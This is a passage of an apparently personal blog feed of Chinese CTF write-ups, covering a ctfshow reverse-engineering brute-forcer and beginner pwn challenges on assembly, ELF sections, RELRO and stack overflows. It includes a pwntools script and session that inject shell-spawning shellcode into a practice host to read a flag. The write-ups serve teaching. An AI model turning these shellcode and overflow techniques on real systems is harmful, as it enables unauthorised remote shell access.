class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CTF=<span class="string">&#x27;ctfshow&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decript</span>(<span class="params">L,n,password,k</span>):</span><br><span class="line">    T=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        j=i%k</span><br><span class="line">        T.append(L[i]^(<span class="number">0xff</span>-password[j]))</span><br><span class="line">    res=<span class="built_in">bytes</span>(T)</span><br><span class="line">    <span class="keyword">return</span> CTF <span class="keyword">in</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>(<span class="params">fname</span>):</span><br><span class="line">    f=<span class="built_in">open</span>(fname,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    exe=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    offset=<span class="number">0x2040</span></span><br><span class="line">    n=<span class="number">622</span></span><br><span class="line">    code=exe[offset:offset+n]</span><br><span class="line">    L=<span class="built_in">list</span>(code)</span><br><span class="line">    charset=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x41</span>,<span class="number">0x41</span>+<span class="number">26</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x61</span>,<span class="number">0x61</span>+<span class="number">26</span>))</span><br><span class="line">    R=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">                r=decript(L,n,[a,b,c],<span class="number">3</span>)</span><br><span class="line">                <span class="comment">#print(a,b,c,r)</span></span><br><span class="line">                <span class="keyword">if</span> r:</span><br><span class="line">                    s=<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(s,<span class="string">&#x27;is ok!!!&#x27;</span>)</span><br><span class="line">                    R.append(s)</span><br><span class="line">    <span class="built_in">print</span>(R)</span><br><span class="line">               </span><br><span class="line"></span><br><span class="line">brute(<span class="string">&#x27;ctfshow01.exe&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><p>我以为是非预期的预期：</p><p>43544653686f777b5468616e6b5f43544653484f575f536b797d</p><p>43 54 46 53 68 6f 77 7b 54 68 61 6e 6b 5f 43 54 46 53 48 4f 57 5f 53 6b 79 7d</p><p>CTFShow{Thank_CTFSHOW_Sky}</p><p>（不过我都看到这个了，还没联想Crypto第二题那个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><p>不是？我连断点都没下，直接出flag？</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240709150257703.png" alt="image-20240709150257703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;西瓜杯&quot;&gt;&lt;a href=&quot;#西瓜杯&quot; class=&quot;headerlink&quot; title=&quot;西瓜杯&quot;&gt;&lt;/a&gt;西瓜杯&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwn30--52</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/</id>
    <published>2024-06-02T16:00:00.000Z</published>
    <updated>2024-09-16T08:03:41.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-study"><a href="#PWN-study" class="headerlink" title="PWN-study"></a>PWN-study</h1><h3 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h3><p>用户名为 ctfshow 密码 为 123456  # 注意密码不是ctfshow</p><p>请使用 ssh软件连接 <code>ssh ctfshow@题目地址 -p题目端口号</code></p><h3 id="pwn1-4"><a href="#pwn1-4" class="headerlink" title="pwn1-4"></a>pwn1-4</h3><ul><li>system(cat &#x2F;ctfshow_flag)</li><li>pwd–ls–cat</li><li>反编译看结果（实际不用（</li><li>有点逆向味道，找到比较字符串，明文存储。但是记得，没有回显&#x2F;。。</li></ul><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="pwn5-12"><a href="#pwn5-12" class="headerlink" title="pwn5-12"></a>pwn5-12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line">// eax = 114514</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line">//edx=0x36D</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line">//ecx=0x80490E8</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">//eax=0x636C6557</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**pwn9:**那么080490E8地址单元中的值就为：636C6557h，后面的h表示给数值是16进制。所以本条代码执行后eax寄存器中的值就为636C6557h。 所以本题的flag为：ctfshow{0x636C6557} </p><p>使用 nasm 命令对该汇编文件进行编译，指定输出格式为 ELF 格式，这种格式是一种在 UNIX 系统中广泛使用的可执行文件格式，它包含了程序的二进制代码、数据、符号表等信息。 <strong>nasm -f elf Welcome_to_CTFshow.asm</strong> 将该文件链接成可执行文件 <strong>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</strong> ld: 这是 GNU 链接器的命令。</p><p>-m elf_i386: 这个选项指定链接器工作在 i386 架构下，生成针对 ELF 格式的目标文件。i386 是 Intel 的 32 位架构。</p><p>-s: 这个选项告诉链接器在生成的可执行文件中去除符号表和调试信息，以减小文件大小。</p><p>-o Welcome_to_CTFshow: 这个选项指定生成的可执行文件的文件名为 Welcome_to_CTFshow。</p><p>Welcome_to_CTFshow.o: 这是要链接的输入文件，是由汇编器生成的对象文件，它包含了汇编代码的已编译二进制表示。 checksec Welcome_to_CTFshow 选中使用快捷键 A 将数据转换为字符串</p><h2 id="二进制文件基础"><a href="#二进制文件基础" class="headerlink" title="二进制文件基础"></a>二进制文件基础</h2><h3 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h3><p>gcc -o flag flag.c———-ctfshow{hOw_t0_us3_GCC?}</p><h3 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h3><p>&#x2F;&#x2F;&#x2F;链接文件</p><p>echo CTFshow &gt; key # 创建内容为CTFshow的key文件 gcc -o flag .&#x2F;flag.c # 编译flag.c .&#x2F;flag #运行flag文件那flag</p><h3 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 flag.asm # 将flag.asm编译成64为.o文件</span><br><span class="line">ld -s -o flag flag.o # 将flag.o链接成flag可执行文件</span><br><span class="line">./flag # 运行flag可执行文件拿到flag</span><br></pre></td></tr></table></figure><h3 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o flag flag.s # 将flag.s编译成flag可执行文件</span><br><span class="line">./flag # 运行flag可执行文件拿到flag</span><br></pre></td></tr></table></figure><h3 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h3><p>限制了我们输入字符串的长度为9,system(“&#x2F;bin&#x2F;sh”);是可以获得Linux的交互式shell的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">cat /ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="Linux相关基础命令"><a href="#Linux相关基础命令" class="headerlink" title="Linux相关基础命令"></a>Linux相关基础命令</h2><h3 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h3><p>echo &gt;&gt; 两个&gt;表示追加</p><p>echo &gt; 一个&gt;表示覆盖</p><h3 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h3><p>关闭了输出流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// attributes: thunk</span><br><span class="line">__pid_t fork(void)</span><br><span class="line">&#123;</span><br><span class="line">  return fork();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 &gt;&amp;0定向到输入流</p><p>输入命令’pwd &gt;&amp;0’之后，给我们返回了&#x2F;，代表我们所处根路径。</p><p>再重新nc连接(因为这个程序给我们执行命令的环境不是交互式的，所以我们需要再次nc连接执行命令)，使用ls &gt;&amp;0查看根目录。</p><p>再使用cat ctfshow_flag &gt;&amp;0</p><h2 id="Linux安全机制"><a href="#Linux安全机制" class="headerlink" title="Linux安全机制"></a>Linux安全机制</h2><h3 id="got-plt"><a href="#got-plt" class="headerlink" title=".got  .plt"></a>.got  .plt</h3><p>》<a href="http://t.csdnimg.cn/NfKt8">http://t.csdnimg.cn/NfKt8</a></p><p><strong>运行时重定位</strong></p><p><strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式</strong>。这个过程称为<strong>链接时重定位</strong></p><p>printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p><p>存放函数地址的数据表，称为<strong>重局偏移表</strong>（GOT, Global Offset Table），而那个额外代码段表，称为<strong>程序链接表</strong>（PLT，Procedure Link Table）。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏</strong>。</p><p><img src="https://img-blog.csdn.net/20160611124517413" alt="PLT和GOT原理雏形"></p><p>当然这个原理图并不是Linux下的PLT&#x2F;GOT真实过程，Linux下的PLT&#x2F;GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT&#x2F;GOT是如何穿针引线的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件</span><br><span class="line">当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line">当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line">当RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure><h3 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br><span class="line">[Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line"> [21] .got              PROGBITS         0000000000600f18  00000f18</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600f28  00000f28</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>ctfshow{1_1_0x600f18_0x600f28}</p><h3 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec ppwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ppwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S ppwn     </span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br></pre></td></tr></table></figure><h3 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec pwwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S pwwn</span><br><span class="line">x  [12] .plt              PROGBITS         0000000000400450  00000450</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc0  00000fc0</span><br><span class="line">       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ctfshow{0_0_0x600fc0}</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><p>ctfshow函数是一个可以利用栈溢出的<a href="https://so.csdn.net/so/search?q=strcpy%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">strcpy函数</a>，我们就要尽可能的输入更多的字符串以让程序发生溢出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : No canary found                                         </span><br><span class="line">    * *************************************                           </span><br><span class="line">How to input ?</span><br><span class="line">ctfshow&#123;1c6bbef8-addb-4f20-a6ce-512f3684d46f&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h3><h5 id="题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp"><a href="#题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp" class="headerlink" title="题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp"></a>题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python</span><br><span class="line">Python 2.7.17 (default, Mar  8 2023, 18:40:28) </span><br><span class="line">[GCC 7.5.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274: Trying 124.223.158.81</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28274: Done</span><br><span class="line">&gt;&gt;&gt; payload = asm(shellcraft.sh())</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments                          </span><br><span class="line">    * *************************************                           </span><br><span class="line">jhh///sh/bin��h••••�4$ri••1�Qj•Y•�Q��1�j</span><br><span class="line">                                        X̀</span><br><span class="line">���F</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">ctfshow_flag</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;c9ed6187-a6c6-40ae-a2b6-77d5a628be4b&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3><h5 id="开启NX保护，或许可以试试ret2libc"><a href="#开启NX保护，或许可以试试ret2libc" class="headerlink" title="开启NX保护，或许可以试试ret2libc"></a><strong>开启NX保护，或许可以试试ret2libc</strong></h5><p><a href="https://wiki.wgpsec.org/knowledge/ctf/re2libc.html">https://wiki.wgpsec.org/knowledge/ctf/re2libc.html</a></p><p>你可以使用pwntools的shellcraft模块来进行攻击</p><p>32位程序，使用IDA反编译，看到读入的buf为132个长度，而read()函数限制我们读入的长度位0x100，也就是256个长度，所以ctfshow()函数存在栈溢出。</p><p><img src="C:/Users/17687/AppData/Roaming/Typora/typora-user-images/image-20240527164637420.png?lastModify=1726473725" alt="image-20240527164637420"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 8048376:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 804837c:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 8048386:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 804838b:   e9 e0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 8048396:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 804839b:   e9 d0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:   ff 25 14 a0 04 08       jmp    *0x804a014</span><br><span class="line"> 80483a6:   68 10 00 00 00          push   $0x10</span><br><span class="line"> 80483ab:   e9 c0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:   ff 25 18 a0 04 08       jmp    *0x804a018</span><br><span class="line"> 80483b6:   68 18 00 00 00          push   $0x18</span><br><span class="line"> 80483bb:   e9 b0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:   ff 25 1c a0 04 08       jmp    *0x804a01c</span><br><span class="line"> 80483c6:   68 